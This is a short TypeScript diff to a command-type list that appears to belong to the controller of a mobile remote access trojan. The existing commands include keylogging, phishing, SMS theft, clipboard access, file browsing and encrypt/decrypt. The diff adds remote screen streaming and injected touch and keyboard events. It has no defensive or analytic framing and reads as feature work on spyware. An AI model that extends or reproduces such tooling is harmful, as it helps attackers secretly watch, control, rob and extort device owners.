@@ -20,7 +20,8 @@ export type CommandType =
   | 'toast' | 'vibrate' | 'play-audio' | 'stop-audio'
   | 'clipboard' | 'sendSms' | 'keylogger-on' | 'keylogger-off'
   | 'open-url' | 'phishing' | 'encrypt' | 'decrypt'
-  | 'apps' | 'file-explorer' | 'all-sms' | 'popNotification';
+  | 'apps' | 'file-explorer' | 'all-sms' | 'popNotification'
+  | 'start-screen-stream' | 'stop-screen-stream' | 'touch-event' | 'keyboard-event';
 
 export interface CommandAttributes {
   id: number;
